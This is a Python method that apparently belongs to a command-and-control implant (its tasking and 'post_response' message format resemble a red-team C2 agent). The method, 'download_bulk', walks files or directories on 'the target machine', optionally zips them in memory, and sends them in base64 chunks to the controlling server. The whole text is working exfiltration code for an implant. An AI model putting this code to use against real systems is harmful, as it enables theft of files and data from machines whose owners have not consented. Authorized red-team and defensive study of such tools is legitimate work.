        def download_bulk(self, task_id, path, mode="archive"):
                """
                Bulk download files or a directory from the target machine.

                Args:
                    task_id: The task identifier for this operation.
                    path: A file path, directory path, or JSON list of file paths (absolute paths).
                    mode: "iterative" to send files one by one, or "archive" to bundle into
                          an in-memory zip and send as a single file (default: "archive").
                """
                import zipfile
                import io

                # Resolve the list of files to download.
                # archive_base_dir is used in archive mode to compute relative arcnames that
                # preserve the original directory structure inside the zip.
                file_list = []
                archive_base_dir = None

                # Check if path is a JSON list of files
                if isinstance(path, list):
                    # Normalise each path in the list to absolute
                    file_list = [
                        f if os.path.isabs(f) else os.path.join(self.current_directory, f)
                        for f in path
                    ]
                    # Anchor arcnames at the filesystem root so each entry's full path is
                    # preserved inside the archive (e.g. "etc/nginx/nginx.conf").
                    archive_base_dir = os.sep
                else:
                    # Normalise to absolute path
                    abs_path = path if os.path.isabs(path) \
                        else os.path.join(self.current_directory, path)

                    if os.path.isdir(abs_path):
                        # Walk the directory and collect all files.
                        # Anchor at the parent so the directory name itself appears in the
                        # archive (e.g. specifying /etc/nginx gives nginx/nginx.conf inside
                        # the zip rather than stripping the top-level name).
                        archive_base_dir = os.path.dirname(abs_path)
                        for root, dirs, files in os.walk(abs_path):
                            for fname in files:
                                file_list.append(os.path.join(root, fname))
                    elif os.path.isfile(abs_path):
                        # Single file: preserve just the filename, no leading path.
                        archive_base_dir = os.path.dirname(abs_path)
                        file_list = [abs_path]
                    else:
                        return "Path does not exist or is not accessible: {}".format(abs_path)

                if not file_list:
                    return "No files found to download."

                # Cache the task reference once to avoid repeated O(n) lookups inside loops
                task_ref = [task for task in self.taskings if task["task_id"] == task_id][0]

                results = []

                if mode == "iterative":
                    # Download each file individually using the same chunked approach as download()
                    for file_path in file_list:
                        if task_ref["stopped"]:
                            return "Job stopped."

                        if not os.path.isfile(file_path):
                            results.append("Skipped (not a file): {}".format(file_path))
                            continue

                        file_size = os.stat(file_path).st_size
                        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)

                        data = {
                            "action": "post_response",
                            "responses": [{
                                "task_id": task_id,
                                "download": {
                                    "total_chunks": total_chunks,
                                    "full_path": file_path,
                                    "chunk_size": CHUNK_SIZE
                                }
                            }]
                        }
                        initial_response = self.postMessageAndRetrieveResponse(data)
                        file_id = initial_response["responses"][0]["file_id"]
                        chunk_num = 1

                        with open(file_path, 'rb') as f:
                            while True:
                                if task_ref["stopped"]:
                                    return "Job stopped."

                                content = f.read(CHUNK_SIZE)
                                if not content:
                                    break

                                data = {
                                    "action": "post_response",
                                    "responses": [{
                                        "task_id": task_id,
                                        "download": {
                                            "chunk_num": chunk_num,
                                            "file_id": file_id,
                                            "chunk_data": base64.b64encode(content).decode()
                                        }
                                    }]
                                }
                                chunk_num += 1
                                self.postMessageAndRetrieveResponse(data)

                        results.append(json.dumps({"agent_file_id": file_id, "file_path": file_path}))

                    return "\n".join(results)

                else:
                    # Archive mode: build an in-memory zip and send it as a single file.
                    # Directory structure is preserved inside the archive using arcnames
                    # computed relative to archive_base_dir.
                    zip_buffer = io.BytesIO()
                    with zipfile.ZipFile(zip_buffer, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
                        for file_path in file_list:
                            if task_ref["stopped"]:
                                return "Job stopped."

                            if not os.path.isfile(file_path):
                                continue

                            # Preserve the original directory structure: compute the path
                            # relative to archive_base_dir so that sub-directories appear as
                            # real zip entries (e.g. nginx/conf.d/default.conf) rather than
                            # flat names with underscores.
                            arcname = os.path.relpath(file_path, archive_base_dir)
                            zf.write(file_path, arcname)

                    zip_data = zip_buffer.getvalue()
                    zip_buffer.close()

                    archive_name = "download_bulk_{}.zip".format(task_id)
                    total_chunks = int(len(zip_data) / CHUNK_SIZE) + (len(zip_data) % CHUNK_SIZE > 0)

                    data = {
                        "action": "post_response",
                        "responses": [{
                            "task_id": task_id,
                            "download": {
                                "total_chunks": total_chunks,
                                "full_path": archive_name,
                                "chunk_size": CHUNK_SIZE
                            }
                        }]
                    }
                    initial_response = self.postMessageAndRetrieveResponse(data)
                    file_id = initial_response["responses"][0]["file_id"]
                    chunk_num = 1
                    offset = 0

                    while offset < len(zip_data):
                        if task_ref["stopped"]:
                            return "Job stopped."

                        chunk = zip_data[offset:offset + CHUNK_SIZE]
                        data = {
                            "action": "post_response",
                            "responses": [{
                                "task_id": task_id,
                                "download": {
                                    "chunk_num": chunk_num,
                                    "file_id": file_id,
                                    "chunk_data": base64.b64encode(chunk).decode()
                                }
                            }]
                        }
                        chunk_num += 1
                        offset += CHUNK_SIZE
                        self.postMessageAndRetrieveResponse(data)

                    return json.dumps({"agent_file_id": file_id})

